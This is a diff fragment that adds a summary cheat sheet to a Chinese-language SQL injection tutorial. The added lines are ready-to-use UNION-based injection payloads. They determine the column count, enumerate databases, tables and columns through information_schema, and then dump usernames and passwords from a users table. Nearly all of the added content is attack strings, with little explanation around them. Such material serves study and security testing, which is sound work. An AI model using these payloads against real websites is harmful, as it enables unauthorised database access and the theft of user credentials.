@@ -34,3 +34,14 @@ database()           #数据库名
 6.**获取列名**
 
 7.**获取字段**
+
+8.**总结**
+```
+order by –+ 判断字段数目
+union select –+ 联合查询收集信息
+id=1′ and 1=2 UNION SELECT 1,2,database() –+ 查询当前数据库
+id=1′ and 1=2 UNION SELECT 1,2,group_concat(schema_name) from information_schema.schemata –+查询所有数据库
+id=1′ and 1=2 UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() –+ 查询表名
+ UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name=’users’ –+ 查询列名
+UNION SELECT 1,2,group_concat(id,username,password) from users –+ 查询字段值
+```
